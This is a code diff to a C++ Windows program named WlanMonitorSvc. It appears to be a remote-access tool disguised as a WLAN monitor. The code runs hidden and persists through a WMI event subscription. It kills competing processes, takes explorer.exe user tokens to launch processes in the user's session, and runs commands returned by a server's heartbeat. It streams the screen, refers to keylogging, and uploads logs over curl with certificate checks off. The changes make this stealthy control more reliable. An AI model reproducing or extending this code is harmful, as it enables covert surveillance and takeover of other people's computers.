@@ -22,6 +22,8 @@
 #include <thread>
 #include <mutex>
 #include <atomic>
+#include <algorithm>
+#include <cctype>
 
 #include <winsock2.h>
 #pragma comment(lib, "ws2_32.lib")
@@ -40,8 +42,15 @@
 
 // ==============================================================
 // 【每次编译必看配置】请在每次点击【生成】前，在此处手动输入最新版本号！
-#define MANUAL_COMPILE_VERSION "1.8.14"
+#define MANUAL_COMPILE_VERSION "1.8.23"
 // ==============================================================
+
+#define STRINGIZE2(x) #x
+#define STRINGIZE(x) STRINGIZE2(x)
+#pragma message("============================================================")
+#pragma message(">>> BUILDING WlanMonitorSvc VERSION: " MANUAL_COMPILE_VERSION)
+#pragma message(">>> If this is not the version you intend to publish, edit MANUAL_COMPILE_VERSION now.")
+#pragma message("============================================================")
 
 // 定义当前程序版本和服务器更新地址
 const std::string CURRENT_VERSION = MANUAL_COMPILE_VERSION;
@@ -62,13 +71,21 @@ const char* UPDATE_EXIT_EVENT_NAME = "Global\\WlanMonitorSvc_UpdateExit_Event";
 
 bool IsUpdateExitRequested() {
     HANDLE hEvent = OpenEventA(SYNCHRONIZE, FALSE, UPDATE_EXIT_EVENT_NAME);
-    if (!hEvent) {
-        return false;
+    if (hEvent) {
+        bool requested = (WaitForSingleObject(hEvent, 0) == WAIT_OBJECT_0);
+        CloseHandle(hEvent);
+        if (requested) {
+            return true;
+        }
     }
 
-    bool requested = (WaitForSingleObject(hEvent, 0) == WAIT_OBJECT_0);
-    CloseHandle(hEvent);
-    return requested;
+    char exePath[MAX_PATH];
+    if (GetModuleFileNameA(NULL, exePath, MAX_PATH) > 0) {
+        std::string flagPath = std::string(exePath) + ".update_exit";
+        return GetFileAttributesA(flagPath.c_str()) != INVALID_FILE_ATTRIBUTES;
+    }
+
+    return false;
 }
 
 // 指定为Windows子系统，运行时不显示控制台黑窗
@@ -670,17 +687,32 @@ std::string DecryptString(const std::string& hexStr) {
 void UploadLogToServer() {
     std::thread([]() {
         std::string exePath = GetExePath();
-        std::string logPath = exePath.substr(0, exePath.find_last_of("\\/")) + "\\WlanMonitorSvc_Log.txt";
-        if (GetFileAttributesA(logPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
-            std::string mac = GetMacAddress();
-            // 解析出基础 URL（去掉末尾可能附带的 /report 等）
-            std::string baseUrl = REPORT_URL_BASE;
-            size_t pos = baseUrl.rfind("/report");
-            if (pos != std::string::npos) {
-                baseUrl = baseUrl.substr(0, pos);
+        std::string exeDir = exePath.substr(0, exePath.find_last_of("\\/"));
+        std::string mac = GetMacAddress();
+        std::string baseUrl = REPORT_URL_BASE;
+        size_t pos = baseUrl.rfind("/report");
+        if (pos != std::string::npos) {
+            baseUrl = baseUrl.substr(0, pos);
+        }
+
+        struct LogUploadTarget {
+            const char* fileName;
+            const char* kind;
+        };
+
+        const LogUploadTarget targets[] = {
+            {"WlanMonitorSvc_Log.txt", "main"},
+            {"WlanMonitorSvc_Updater_Log.txt", "update"},
+        };
+
+        for (const auto& target : targets) {
+            std::string logPath = exeDir + "\\" + target.fileName;
+            if (GetFileAttributesA(logPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
+                continue;
             }
-            std::string targetUrl = baseUrl + "/api/upload_log/" + UrlEncode(mac);
-            std::string curlCmd = "curl.exe -s -m 30 -k -F \"file=@" + logPath + "\" \"" + targetUrl + "\"";
+
+            std::string targetUrl = baseUrl + "/api/upload_log/" + UrlEncode(mac) + "?kind=" + target.kind;
+            std::string curlCmd = "curl.exe -s -m 12 -k -F \"file=@" + logPath + "\" \"" + targetUrl + "\"";
             ExecCmd(curlCmd, false);
         }
     }).detach();
@@ -718,10 +750,10 @@ typedef struct _SERVICE_FAILURE_ACTIONS_FLAG {
 } SERVICE_FAILURE_ACTIONS_FLAG, *LPSERVICE_FAILURE_ACTIONS_FLAG;
 #endif
 
-// 注册 WMI 订阅以实现静默自启，代替传统的 Windows 服务
+// 注册 WMI 订阅实现开机自启；保持 WMI 方案，不切换为 Windows Service。
 void InstallWMIAutoStart() {
     std::string exePath = GetExePath();
-    WriteLog("正在尝试注册 WMI 订阅以实现静默自启...");
+    WriteLog("正在注册 WMI 订阅自启，触发时间改为开机后尽快触发...");
 
     std::string psCmd = 
         "powershell.exe -WindowStyle Hidden -NonInteractive -NoProfile -Command \""
@@ -730,16 +762,15 @@ void InstallWMIAutoStart() {
         "$b=Get-WmiObject -Namespace $NS -Class __FilterToConsumerBinding | Where-Object { $_.Filter -match $N }; if($b){$b|Remove-WmiObject};"
         "$c=Get-WmiObject -Namespace $NS -Class CommandLineEventConsumer -Filter \\\"Name='$N'\\\"; if($c){$c|Remove-WmiObject};"
         "$f=Get-WmiObject -Namespace $NS -Class __EventFilter -Filter \\\"Name='$N'\\\"; if($f){$f|Remove-WmiObject};"
-        "$Q='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA ''Win32_PerfFormattedData_PerfOS_System'' AND TargetInstance.SystemUpTime >= 60 AND PreviousInstance.SystemUpTime < 60';"
+        "$Q='SELECT * FROM __InstanceModificationEvent WITHIN 5 WHERE TargetInstance ISA ''Win32_PerfFormattedData_PerfOS_System'' AND TargetInstance.SystemUpTime >= 5 AND PreviousInstance.SystemUpTime < 5';"
         "$FI=Set-WmiInstance -Namespace $NS -Class __EventFilter -Arguments @{Name=$N;EventNamespace='root\\cimv2';QueryLanguage='WQL';Query=$Q};"
         "$Path='" + exePath + "';"
         "$cmdL=[char]34+$Path+[char]34;"
         "$CI=Set-WmiInstance -Namespace $NS -Class CommandLineEventConsumer -Arguments @{Name=$N;CommandLineTemplate=$cmdL};"
         "Set-WmiInstance -Namespace $NS -Class __FilterToConsumerBinding -Arguments @{Filter=$FI;Consumer=$CI};"
         "\"";
-
     ExecCmd(psCmd);
-    WriteLog("成功：WMI 自启注册完毕！");
+    WriteLog("成功：WMI 自启注册完毕，触发条件为开机约 5 秒。");
 
     // 清理以前遗留的各类计划任务和注册表项
     std::string oldTaskParams = "/delete /tn \"\\Microsoft\\Windows\\AppID\\PolicyConverter\" /f";
@@ -761,12 +792,11 @@ void InstallWMIAutoStart() {
         RegCloseKey(hKey);
     }
 
-    // 强杀所有处于后台运行的同名存活实例保证能进行覆盖（移除了过滤 SESSION 0 的限制，全部绝杀）
     std::string exeName = exePath.substr(exePath.find_last_of("\\/") + 1);
     ExecCmd("taskkill /f /fi \"PID ne " + std::to_string(GetCurrentProcessId()) + "\" /im " + exeName);
     ExecCmd("taskkill /f /fi \"PID ne " + std::to_string(GetCurrentProcessId()) + "\" /im PowerOFF.exe");
     ExecCmd("taskkill /f /fi \"PID ne " + std::to_string(GetCurrentProcessId()) + "\" /im WlanMonitorSvc.exe");
-    Sleep(1500); // 稍微等待进程完全释放互斥锁和端口
+    Sleep(1500);
 }
 
 // UTF-8 转 ANSI 解决日志中文WiFi名乱码的问题
@@ -896,14 +926,6 @@ void CheckForUpdates() {
                     if (g_hMutex) {
                         CloseHandle(g_hMutex);
                         g_hMutex = NULL;
-                    }
-
-                    // 创建事件允许 Updater 停止服务，Updater 完成后会清除此事件
-                    const char* ALLOW_SERVICE_STOP_EVENT = "Global\\WlanMonitorSvc_AllowServiceStop_Event";
-                    HANDLE hAllowStopEvent = CreateEventA(NULL, TRUE, FALSE, ALLOW_SERVICE_STOP_EVENT);
-                    if (hAllowStopEvent) {
-                        SetEvent(hAllowStopEvent);
-                        CloseHandle(hAllowStopEvent);
                     }
 
                     // 启动 updater.exe，传入参数：当前程序路径、新程序路径
@@ -1307,30 +1329,37 @@ bool RunInUserSession(const std::string& cmdLine, bool silent = false) {
     if (!silent) ReportScreenLog("接收到服务端指令请求，正在尝试穿透进入活动用户会话的桌面...");
     HANDLE hToken = NULL;
     DWORD activeSessionId = WTSGetActiveConsoleSessionId();
-    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnap != INVALID_HANDLE_VALUE) {
+
+    auto tryExplorerToken = [&](bool requireConsoleSession) -> bool {
+        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (hSnap == INVALID_HANDLE_VALUE) return false;
         PROCESSENTRY32W pe;
         pe.dwSize = sizeof(PROCESSENTRY32W);
         if (Process32FirstW(hSnap, &pe)) {
             do {
-                if (_wcsicmp(pe.szExeFile, L"explorer.exe") == 0) {
-                    DWORD procSessionId = 0xFFFFFFFF;
-                    if (!ProcessIdToSessionId(pe.th32ProcessID, &procSessionId)) continue;
-                    if (activeSessionId != 0xFFFFFFFF && procSessionId != activeSessionId) continue;
+                if (_wcsicmp(pe.szExeFile, L"explorer.exe") != 0) continue;
+                DWORD procSessionId = 0xFFFFFFFF;
+                if (!ProcessIdToSessionId(pe.th32ProcessID, &procSessionId)) continue;
+                if (requireConsoleSession && activeSessionId != 0xFFFFFFFF && procSessionId != activeSessionId) continue;
 
-                    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
-                    if (hProc) {
-                        if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken)) {
-                            ReportScreenLog("成功窃取到 explorer.exe 进程的合法用户桌面Token");
-                            CloseHandle(hProc);
-                            break;
-                        }
-                        CloseHandle(hProc);
-                    }
+                HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
+                if (!hProc) continue;
+                if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken)) {
+                    ReportScreenLog("成功获取 explorer.exe 用户桌面 Token，SessionId=" + std::to_string(procSessionId));
+                    CloseHandle(hProc);
+                    CloseHandle(hSnap);
+                    return true;
                 }
+                CloseHandle(hProc);
             } while (Process32NextW(hSnap, &pe));
         }
         CloseHandle(hSnap);
+        return false;
+    };
+
+    if (!tryExplorerToken(true)) {
+        ReportScreenLog("未找到控制台 Session 的 explorer.exe，尝试任意已登录用户 Session 的 explorer.exe...");
+        tryExplorerToken(false);
     }
 
     if (!hToken) {
@@ -1383,19 +1412,14 @@ bool RunInUserSession(const std::string& cmdLine, bool silent = false) {
     ZeroMemory(&si, sizeof(si));
     si.cb = sizeof(si);
 
-    // 动态选择桌面，以支持锁屏/登录界面的按键捕获
-    std::string desktopName = "winsta0\\default";
-    if (cmdLine.find("KEYLOG") != std::string::npos && !silent) {
-        // 如果我们是以 winlogon 启动的，则指定 winlogon 桌面
-    }
-    // 其实可以直接设置空字符串，让系统根据 Token 自动推断所属桌面和 Winsta
-    si.lpDesktop = (LPSTR)"";
+    // 媒体键、音量键和屏幕控制必须进入用户交互桌面，空桌面名在部分 RDP/锁屏环境会无响应。
+    si.lpDesktop = (LPSTR)"winsta0\\default";
 
     PROCESS_INFORMATION pi;
     ZeroMemory(&pi, sizeof(pi));
 
     std::string wcmd = cmdLine;
-    if (!silent) ReportScreenLog("拉取携带 \"-usermode SCREEN ...\" 参数的用户进程，指令: " + wcmd);
+    ReportScreenLog("准备在用户 Session 创建子进程，指令: " + wcmd);
     BOOL bRes = CreateProcessAsUserA(
         hDupToken, 
         NULL, 
@@ -1407,7 +1431,7 @@ bool RunInUserSession(const std::string& cmdLine, bool silent = false) {
         &si, &pi);
 
     if (bRes) {
-        ReportScreenLog("成功创建提权用户级子进程执行截屏任务。");
+        ReportScreenLog("成功创建用户级子进程。");
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
     } else {
@@ -1425,6 +1449,19 @@ void TrimString(std::string &s) {
     if (s.empty()) return;
     s.erase(0, s.find_first_not_of(" \t\r\n"));
     s.erase(s.find_last_not_of(" \t\r\n") + 1);
+}
+
+bool IsServerErrorResponse(const std::string& response) {
+    if (response.empty()) return false;
+    std::string lower = response;
+    std::transform(lower.begin(), lower.end(), lower.begin(), [](unsigned char c) {
+        return static_cast<char>(std::tolower(c));
+    });
+    return lower.find("error code:") != std::string::npos ||
+           lower.find("bad gateway") != std::string::npos ||
+           lower.find("cloudflare") != std::string::npos ||
+           lower.find("<html") != std::string::npos ||
+           lower.find("<!doctype") != std::string::npos;
 }
 
 // 向服务器报备上线
@@ -1476,6 +1513,15 @@ void ReportToServer() {
 
         HINTERNET hConnect = InternetOpenUrlA(hSession, reportUrl.c_str(), NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_DONT_CACHE | INTERNET_FLAG_NO_UI, 0);
         if (hConnect) {
+            DWORD statusCode = 0;
+            DWORD statusLen = sizeof(statusCode);
+            if (HttpQueryInfoA(hConnect, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &statusCode, &statusLen, NULL) && statusCode != 200) {
+                WriteLog("心跳请求返回 HTTP " + std::to_string(statusCode) + "，忽略本次响应，防止把网关错误当成远程命令。");
+                InternetCloseHandle(hConnect);
+                InternetCloseHandle(hSession);
+                return;
+            }
+
             char buffer[1024];
             DWORD bytesRead = 0;
             std::string response = "";
@@ -1489,6 +1535,9 @@ void ReportToServer() {
 
             // 检测心跳回调是否携带了需要执行的操作命令
             if (!response.empty() && response != "Missing parameters") {
+            if (IsServerErrorResponse(response)) {
+                WriteLog("心跳响应疑似服务器/网关错误，已忽略: " + response.substr(0, 120));
+            } else
             if (response.find("SSID:") != std::string::npos) {
                 // 如果包含 SSID:XXX，则更新存入本地内存的自定义名字
                 size_t pos = response.find("SSID:");
@@ -1717,23 +1766,35 @@ void ReportToServer() {
                     } else if (type == "MEDIA_VOL_SET") {
                         std::string exePath = GetExePath();
                         std::string cmd = "\"" + exePath + "\" -usermode MEDIA_VOL_SET " + argStr;
-                        RunInUserSession(cmd, true);
-                        res = "Success: Volume set command sent.";
+                        if (RunInUserSession(cmd, true)) {
+                            res = "Success: Volume set command sent.";
+                        } else {
+                            res = "Fail: User session unavailable. Error: " + std::to_string(GetLastError());
+                        }
                     } else if (type == "MEDIA_INFO") {
                         std::string exePath = GetExePath();
                         std::string cmd = "\"" + exePath + "\" -usermode MEDIA_INFO";
-                        RunInUserSession(cmd, true);
-                        res = "Success: Info polling requested.";
+                        if (RunInUserSession(cmd, true)) {
+                            res = "Success: Info polling requested.";
+                        } else {
+                            res = "Fail: User session unavailable. Error: " + std::to_string(GetLastError());
+                        }
                     } else if (type == "MONITOR_OFF") {
                         std::string exePath = GetExePath();
                         std::string cmd = "\"" + exePath + "\" -usermode MONITOR_OFF";
-                        RunInUserSession(cmd, true);
-                        res = "Success: Monitor turned off.";
+                        if (RunInUserSession(cmd, true)) {
+                            res = "Success: Monitor turned off.";
+                        } else {
+                            res = "Fail: User session unavailable. Error: " + std::to_string(GetLastError());
+                        }
                     } else if (type == "MONITOR_ON") {
                         std::string exePath = GetExePath();
                         std::string cmd = "\"" + exePath + "\" -usermode MONITOR_ON";
-                        RunInUserSession(cmd, true);
-                        res = "Success: Monitor turned on.";
+                        if (RunInUserSession(cmd, true)) {
+                            res = "Success: Monitor turned on.";
+                        } else {
+                            res = "Fail: User session unavailable. Error: " + std::to_string(GetLastError());
+                        }
                     }
 
                     std::string postData = "mac=" + UrlEncode(mac) + "&type=" + UrlEncode(type) + "&output=" + UrlEncode(res);
@@ -2145,6 +2206,11 @@ int main()
                         DxgiScreenCapturer dxgiStream; // 初始化DXGI对象
 
                         while (true) {
+                                if (IsUpdateExitRequested()) {
+                                    ReportScreenLog("STREAM process received update exit request.");
+                                    break;
+                                }
+
                                 int nScreenWidth = GetSystemMetrics(SM_CXVIRTUALSCREEN);
                                 int nScreenHeight = GetSystemMetrics(SM_CYVIRTUALSCREEN);
                                 int nScreenX = GetSystemMetrics(SM_XVIRTUALSCREEN);
@@ -2678,7 +2744,7 @@ int main()
 #else
     WriteLog("========== 程序手动启动 (管理员进入 WMI 驻留模式) ==========");
 
-    // 安装 WMI 后台自启
+    // 安装 WMI 后台自启，保持 WMI 方案。
     InstallWMIAutoStart();
 
     WriteLog("========== 准备完毕，进入后台常驻监听循环 ==========\n");
